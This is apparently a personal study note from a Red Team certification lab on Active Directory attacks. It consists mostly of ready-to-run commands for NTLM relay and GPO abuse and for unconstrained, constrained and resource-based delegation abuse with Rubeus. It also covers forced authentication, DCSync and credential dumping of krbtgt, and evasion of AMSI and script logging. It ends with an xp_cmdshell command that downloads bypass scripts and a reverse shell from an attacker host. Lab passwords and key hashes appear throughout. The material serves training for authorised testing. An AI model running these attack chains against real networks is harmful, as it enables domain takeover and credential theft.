---
title: "Credentials Access Techniques"
date: 2025-03-27 10:03:00 +0000
categories: [Certifications Technical Notes, Certified Red Team Professional (CRTP)]
tags: [active directory attacks, offensive security]
---

## Abuse GPO write permissions on share (NTLM Relay)

1. Launch `ntlmrelayx`
```bash
    sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
```

2. Create shortcut and set it to connect to the `ntlmrelayx` server
```powershell
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.x' -UseDefaultCredentials"
```

3. Now we can place it to the shared folder
```powershell
    xcopy C:\AD\Tools\studentx.lnk \\dcorp-ci\AI
```

4. After getting LDAP shell, we will abuse WriteDACL permissions over Devops policy and upgrade permissions to our student user
```powershell
    write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

- PS : Alternatively, if we do not have access to any domain users, we can add a computer object and provide it the 'write_gpo_dacl' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}

- Add a GPO
  1. Create new template with GPOddity (stop LDAP)
```bash
      cd /mnt/c/AD/Tools/GPOddity

      sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
```

  2. In another terminal we create and share the directory where we created the template
```bash
      mkdir /mnt/c/AD/Tools/stdx-gp
      cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
```

  3. Share with full permissions the GPO folder
```powershell
      net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
      icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
```

  4. Verify GPO (e.g. DevOps Policy)
```powershell
      Get-DomainGPO -Identity 'DevOps Policy'
```

---

## Unconstrained Delegation

1. InviShell => PowerView

2. Check for unconstrained delegation
```powershell
    Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

3. Ask for TGT with compromised service account
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

4. InviShell then import script to look for local admin privilege
```powershell
    C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

5. Find local admin privilege
```powershell
    Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

6. Copy Loader to compromised machine
```powershell
    echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

7. Connect to compromised machine and port forward to load Rubeus then run Rubeus to monitor
```powershell
    C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

8. Use printer bug to force authentication from dcorp-dc$ (Coercion)
```powershell
    C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

9. Copy encoded ticket and use it in Rubeus
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```

10. Run DCSync with SafetyKatz from this process
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

### Other coercion techniques

- Use the Windows Search Protocol (MS-WSP)
  1. First run monitor mode with Rubeus
```powershell
      C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

  2. Coercion
```powershell
      C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

- Use the Distributed File System Protocol (MS-DFSNM)
  1. First run monitor mode with Rubeus
```powershell
      C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

  2. Coercion
```powershell
      C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

---

- Escalate to Enterprise Admins (Same attack, bigger scope)
  1. Run monitor mode with Rubeus
```powershell
      C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

  2. Force mcorp-dc for authentication to obtain enterprise admin
```powershell
      C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

  3. Store the ticket to DCSync mcorp-dc
```powershell
      C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx...
```

  4. Exploit DCSync
```powershell
      C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

---

## Constrained Delegation

### Enumeration using PowerView

- Enumerate users for constrained delegation
```powershell
    . C:\AD\Tools\PowerView.ps1
    Get-DomainUser -TrustedToAuth
```

- Enumerate computer accounts with constrained delegation enabled
```powershell
    Get-DomainComputer -TrustedToAuth
```

---

### Abuse Constrained Delegation on websvc using Rubeus

1. Request a TGS for websvc as administrator then use that TGS to access the service specified in the `/msdsspn` parameter (which is filesystem on dcorp-mssql)
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

2. Access filesystem on dcorp-mssql
```powershell
    dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

---

### Abuse Constrained Delegation using dcorp-adminsrv with Rubeus

1. DCSync on dcorp-adminsrv$ with its AES key or RC4
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

2. Dump LSA using SafetyKatz
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

---

## Abuse write permissions to access computers as Domain Admin (RBCD)

1. Enumerate using PowerView
```powershell
    Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

2. After disabling script logging and importing PowerView.ps1, we will set RBCD on dcorp-mgmt for our student vm
```powershell
    Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student486$' -Verbose
```

3. Check RBCD
```powershell
    Get-DomainRBCD
```

4. Get AES keys of student VM
```powershell
    C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

5. Abuse RBCD to access dcorp-mgmt as Domain Administrator
```powershell
    C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-studentX$ /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

---

## Exploit MSSQL

1. First we need to import PowerUpSQL for enumeration
```powershell
    Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1; Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

2. Crawl the database links automatically
```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

3. Execute commands on linked databases
```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'set username'"
```

4. Get shell on eu-sql32
```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.86/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.86/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.86/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql32
```